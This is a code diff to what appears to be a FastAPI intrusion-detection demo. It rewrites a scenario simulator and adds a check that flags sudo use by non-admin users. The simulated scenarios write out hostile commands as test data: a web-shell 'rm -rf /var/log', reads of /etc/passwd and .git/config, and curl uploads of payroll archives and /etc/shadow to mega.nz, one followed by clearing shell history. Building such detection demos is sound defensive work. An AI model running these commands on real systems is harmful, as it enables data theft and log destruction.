@@ -159,7 +159,6 @@ def create_http_guard_app(config: Dict) -> FastAPI:
                 pass
         return past_events[::-1]
 
-    import httpx
     @app.post("/api/simulate")
     async def run_simulation(request: Request):
         payload = await request.json()
@@ -168,81 +167,59 @@ def create_http_guard_app(config: Dict) -> FastAPI:
         user_id = payload.get("user_id", "dev_01")
         
         async with httpx.AsyncClient() as client:
-            headers = {}
             base_url = f"http://127.0.0.1:{listen_port}"
+            
+            # Helper to run a single step in a scenario
+            async def send_sim_request(method: str, path: str, ip: str, headers_extra: dict = None, body_data: dict = None):
+                headers = {"x-mock-ip": ip}
+                if headers_extra:
+                    headers.update(headers_extra)
+                try:
+                    if method.upper() == "POST":
+                        await client.post(f"{base_url}{path}", headers=headers, json=body_data)
+                    else:
+                        await client.get(f"{base_url}{path}", headers=headers)
+                except Exception:
+                    pass
+                await asyncio.sleep(0.6)  # Small delay to allow SSE streaming to animate in order
+
             if scenario == "normal_user":
-                headers = {"x-mock-ip": "84.22.12.19"}
-                try:
-                    await client.get(f"{base_url}/normal_path", headers=headers)
-                except Exception:
-                    pass
+                await send_sim_request("GET", "/about", "84.22.12.19")
+                await send_sim_request("GET", "/contact", "84.22.12.19")
+                
             elif scenario == "external_recon":
-                headers = {"x-mock-ip": "198.51.100.42"}
-                try:
-                    await client.get(f"{base_url}/.git/config", headers=headers)
-                except Exception:
-                    pass
+                await send_sim_request("GET", "/.git/config", "198.51.100.42")
+                
             elif scenario == "external_destructive":
-                headers = {"x-mock-ip": "203.0.113.111"}
-                try:
-                    await client.get(f"{base_url}/admin/shell?cmd=rm+-rf+/var/log", headers=headers)
-                except Exception:
-                    pass
+                await send_sim_request("GET", "/admin/shell?cmd=rm%20-rf%20/var/log", "203.0.113.111")
+                
             elif scenario == "insider_normal":
-                headers = {
-                    "x-mock-ip": "192.168.1.75",
-                    "x-user-id": user_id,
-                    "x-user-role": role
-                }
-                try:
-                    await client.post(f"{base_url}/normal_path", headers=headers)
-                except Exception:
-                    pass
+                headers = {"x-user-id": user_id, "x-user-role": role}
+                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "git status"})
+                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "git pull"})
+                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "python main.py"})
+                
             elif scenario == "insider_recon":
-                headers = {
-                    "x-mock-ip": "192.168.1.75",
-                    "x-user-id": user_id,
-                    "x-user-role": role
-                }
-                try:
-                    await client.post(f"{base_url}/hr/employees.csv", headers=headers)
-                except Exception:
-                    pass
+                headers = {"x-user-id": user_id, "x-user-role": role}
+                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "git status"})
+                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "ls -la /etc/passwd"})
+                
             elif scenario == "insider_sabotage":
-                headers = {
-                    "x-mock-ip": "192.168.1.75",
-                    "x-user-id": user_id,
-                    "x-user-role": role
-                }
-                try:
-                    await client.post(f"{base_url}/etc/shadow", headers=headers, json={
-                        "command": "curl -F file=@/etc/shadow mega.nz/upload; history -c",
-                        "cloud_upload": True
-                    })
-                except Exception:
-                    pass
+                headers = {"x-user-id": user_id, "x-user-role": role}
+                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "cat /payroll/employees.csv"})
+                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "tar -czf employees.tar.gz /payroll"})
+                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "curl -F file=@employees.tar.gz mega.nz/upload"})
+                
             elif scenario == "custom_command":
                 cmd = payload.get("command", "")
                 origin = payload.get("origin", "internal")
                 if origin == "external":
                     import urllib.parse
-                    headers = {"x-mock-ip": "84.22.12.19"}
-                    try:
-                        await client.get(f"{base_url}/admin/shell?cmd={urllib.parse.quote(cmd)}", headers=headers)
-                    except Exception:
-                        pass
+                    await send_sim_request("GET", f"/admin/shell?cmd={urllib.parse.quote(cmd)}", "84.22.12.19")
                 else:
-                    headers = {
-                        "x-mock-ip": "192.168.1.75",
-                        "x-user-id": user_id,
-                        "x-user-role": role
-                    }
-                    try:
-                        await client.post(f"{base_url}/custom_insider_command", headers=headers, json={
-                            "command": cmd
-                        })
-                    except Exception:
-                        pass
+                    headers = {"x-user-id": user_id, "x-user-role": role}
+                    await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": cmd})
+                    
         return {"status": "simulation_fired"}
 
     @app.post("/api/unblock")
@@ -427,6 +404,13 @@ def create_http_guard_app(config: Dict) -> FastAPI:
                 "role": request.headers.get("x-user-role", "normal"),
                 **extra_details
             }
+            
+            # Dynamic failed_sudo check: if command starts with sudo and user is not admin, mark it failed
+            cmd_val = action_details.get("command", "")
+            role_val = action_details.get("role", "normal").lower()
+            if cmd_val and cmd_val.strip().lower().startswith("sudo"):
+                if "admin" not in role_val:
+                    action_details["sudo_failed"] = True
             
             signal = UserBehaviorSignal(
                 user_id=request.headers.get("x-user-id", "unknown_user"),
